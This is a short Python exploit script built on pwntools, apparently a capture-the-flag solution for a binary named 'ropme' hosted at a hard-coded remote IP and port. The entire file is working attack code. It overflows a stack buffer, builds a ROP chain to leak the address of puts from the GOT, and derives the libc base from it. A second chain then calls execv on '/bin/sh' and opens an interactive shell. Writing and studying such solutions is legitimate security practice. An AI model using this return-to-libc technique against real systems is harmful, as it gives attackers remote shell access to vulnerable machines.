#!/bin/env python3
from pwn import *

elf = context.binary = ELF('./ropme')

if args.REMOTE:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',  checksec=False)
    p = remote('206.189.124.101', 30847)
else:
    libc = elf.libc
    p = elf.process()

rop = ROP(elf)

rop.raw('A' * 72)
rop.puts(elf.got['puts'])
rop.raw(elf.symbols['main'])

p.sendline(rop.chain())

p.recvline()
puts = u64(p.recv(6) + b'\x00\x00')
log.success(f'leaked puts: {hex(puts)}')

libc.address = puts - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

binsh = next(libc.search(b'/bin/sh\x00'))
rop = ROP(libc)
rop.raw('A' * 72)
rop.execv(binsh)

p.sendline(rop.chain())

p.interactive()

